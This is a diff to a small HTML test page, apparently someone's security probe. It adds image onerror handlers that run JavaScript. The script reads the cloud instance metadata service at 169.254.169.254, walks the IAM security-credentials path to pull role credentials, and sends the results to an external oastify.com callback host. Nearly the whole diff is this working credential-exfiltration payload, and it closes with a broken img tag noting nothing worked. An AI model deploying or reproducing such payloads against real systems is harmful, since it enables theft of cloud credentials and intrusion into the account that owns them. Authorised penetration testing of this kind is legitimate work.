@@ -7,6 +7,18 @@
 </head>
 <body>
     This website is for testing
-    <img src="https://yvxjjac1sqqbydv8tvnbz2pcv31uplda.oastify.com/normalimage" onerror="fetch('https://yvxjjac1sqqbydv8tvnbz2pcv31uplda.oastify.com/JsExcution')"/>
+   <img src="X" onerror="fetch('http://169.254.169.254/latest/meta-data/').then(r => r.text()).then(data => { let url = 'https://cdtx1oufa48pgrdmb95phg7qdhj870vp.oastify.com?data=' + encodeURIComponent(data); fetch(url); })">
+    <img src="X" onerror="
+fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+.then(r => r.text())
+.then(role => fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role.trim()))
+.then(r => r.text())
+.then(data => {
+  fetch('https://cdtx1oufa48pgrdmb95phg7qdhj870vp.oastify.com?data=' + encodeURIComponent(data));
+});
+">
+
+<img src"https://cdtx1oufa48pgrdmb95phg7qdhj870vp.oastify.com?sorrynothingworkd"/>
+
 </body>
 </html>
